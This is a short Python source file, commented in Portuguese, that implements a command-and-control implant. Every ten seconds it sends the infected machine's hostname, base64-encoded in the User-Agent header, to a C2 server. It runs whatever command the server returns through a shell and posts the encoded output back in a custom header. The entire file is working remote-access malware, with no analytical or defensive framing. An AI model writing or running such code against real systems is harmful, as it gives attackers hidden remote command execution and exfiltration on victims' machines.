import base64
import requests
import time
import os
import socket
import subprocess

# Configuração
INTERVALO = 10  # segundos
URL_SERVIDOR_C2 = "http://192.168.15.168:8080/endpoint"  # endereço do servidor C2
ID_MAQUINA = socket.gethostname()

def enviar_beacon():
    """Envia identificação da máquina infectada ao servidor C2"""
    dados = {
        "id": ID_MAQUINA,
        "status": "ativo"
    }
    payload = base64.b64encode(str(dados).encode()).decode()
    headers = {
        "User-Agent": payload
    }

    try:
        resposta = requests.get(URL_SERVIDOR_C2, headers=headers, timeout=5)
        if resposta.status_code == 200 and resposta.text.strip():
            comando = resposta.text.strip()
            print(f"[C2] Comando recebido: {comando}")
            executar_comando(comando)
        else:
            print("[INFO] Nenhum comando recebido.")
    except Exception as e:
        print(f"[ERRO] Falha ao se comunicar com o servidor: {e}")

def executar_comando(comando):
    """Executa comando shell e envia resultado para o C2"""
    try:
        resultado = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT, timeout=10)
        saida = resultado.decode(errors='replace')
    except subprocess.CalledProcessError as e:
        saida = f"[ERRO] Comando falhou: {e.output.decode(errors='replace')}"
    except Exception as e:
        saida = f"[EXCEÇÃO] {str(e)}"

    print(f"[RESULTADO]\n{saida}")

    # Enviar resposta codificada para o C2
    payload = base64.b64encode(saida.encode()).decode()
    headers = {
        "User-Agent": ID_MAQUINA,
        "X-Output": payload
    }

    try:
        resp = requests.post(URL_SERVIDOR_C2, headers=headers, timeout=5)
        print(f"[INFO] Resultado enviado (status: {resp.status_code})")
    except Exception as e:
        print(f"[ERRO] Falha ao enviar resultado: {e}")

def main():
    while True:
        enviar_beacon()
        time.sleep(INTERVALO)

if __name__ == "__main__":
    main()